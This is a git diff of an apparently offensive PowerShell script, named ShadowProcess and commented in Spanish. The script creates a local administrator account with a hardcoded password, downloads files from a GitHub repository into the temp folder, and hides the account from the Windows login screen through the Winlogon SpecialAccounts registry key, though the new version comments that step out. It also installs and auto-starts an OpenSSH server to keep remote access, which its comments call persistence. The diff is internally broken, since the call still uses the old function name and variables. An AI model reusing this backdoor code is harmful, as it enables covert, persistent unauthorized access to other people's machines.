@@ -8,18 +8,18 @@ function random_text {
 
 
 #creando administrador local
-function create_account {
+function Create-NewLocalAdmin {
 	[CmdletBinding()]
 	param (
-		$uname,
-		$pword
+		[string]$NewLocalAdmin,
+		[securestring]$Password
 	)
 	begin {
 	}
 	process {
-		New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
-		Write-Verbose "$uname local user crated"
-		Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+		New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+		Write-Verbose "$NewLocalAdmin local user crated"
+		Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
 		Write-Verbose "$NewLocalAdmin added to the local administrator group"
 		
 	}
@@ -33,8 +33,8 @@ $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
 
 #creando usuario administrador 
-$uname = "ShadowProcess"
-$pword = (ConvertTo-SecureString "Shadowprocess123" -AsPlainText -Force)
+$NewLocalAdmin = "swadmin"
+$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 #ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
@@ -51,14 +51,13 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/re
 
 #instalando registro
 #powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
-powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force
+#powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force
 
 cd $path
 # estableciendo persistencia ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd 
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
 
 
 
